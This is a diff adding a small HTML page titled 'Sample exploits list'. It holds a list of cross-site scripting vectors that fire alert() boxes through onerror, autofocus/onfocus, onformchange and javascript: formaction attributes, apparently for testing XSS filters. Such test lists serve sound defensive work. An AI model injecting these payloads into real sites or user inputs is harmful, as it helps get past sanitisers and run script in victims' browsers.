@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<!--
+To change this license header, choose License Headers in Project Properties.
+To change this template file, choose Tools | Templates
+and open the template in the editor.
+-->
+<html>
+    <head>
+        <title>Sample exploits list</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    </head>
+    <body>
+        <div>
+            <video> <source onerror="javascript:alert(1)">
+            <video onerror="javascript:alert(1)"><source>
+            <audio onerror="javascript:alert(1)"><source>
+            <input autofocus onfocus=alert(1)>
+            <select autofocus onfocus=alert(1)>
+            <textarea autofocus onfocus=alert(1)>
+            <keygen autofocus onfocus=alert(1)>
+            <button form=test onformchange=alert(2)>X
+            <form><button formaction="javascript:alert(1)">
+        </div>
+    </body>
+</html>
